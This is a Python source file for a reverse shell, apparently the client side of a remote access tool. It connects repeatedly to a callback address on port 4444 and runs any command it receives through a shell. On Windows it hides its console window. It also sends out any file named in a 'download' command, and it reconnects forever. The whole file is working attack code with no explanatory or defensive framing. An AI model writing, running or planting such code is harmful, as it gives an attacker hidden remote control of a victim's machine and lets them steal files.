import socket as net
import subprocess as sb
import os
import json
import time

CALLBACK_IP = "127.0.0.1" 
CALLBACK_PORT = 4444

def connect():
    while True:
        try:
            s = net.socket(net.AF_INET, net.SOCK_STREAM)
            s.connect((CALLBACK_IP, CALLBACK_PORT))
            return s
        except:
            time.sleep(5)
def main():
    s = connect()
    
    sb_args = {
        'shell': True,
        'stdout': sb.PIPE,
        'stderr': sb.PIPE,
        'stdin': sb.PIPE
    }
    
    #  ONLY for Windows
    if os.name == 'nt':
        sb_args['creationflags'] = 0x08000000 

    while True:
        try:
            cmd = s.recv(1024).decode('utf-8').strip()
            
            if cmd == "exit":
                break
                
            # File Download
            if cmd.startswith("download"):
                try:
                    
                    filename = cmd[8 : ].strip() 
                    
                    if os.path.isfile(filename):
                        label = {
                            "filename": filename,
                            "filesize": os.path.getsize(filename),
                            "action": "download"
                        }
                        s.send(json.dumps(label).encode())
                        
                        # Handshake
                        ack = s.recv(1024).decode()
                        if ack == "OK":
                            with open(filename, "rb") as f:
                                chunk = f.read(4096)
                                while chunk:
                                    s.send(chunk)
                                    chunk = f.read(4096)
                    else:
                        s.send(b"[-] Error: File does not exist or is a directory.")
                except Exception as e:
                    s.send(f"[-] File Error: {str(e)}".encode())
            
            else:
                proc = sb.Popen(cmd, **sb_args)
                
                output = proc.stdout.read() + proc.stderr.read()
                
                if not output:
                    output = b"[+] Command executed successfully (no output returned)"
                    
                s.send(output)
                
        except Exception as e:
            break
            
    s.close()

if __name__ == "__main__":
    while True:
        main() 
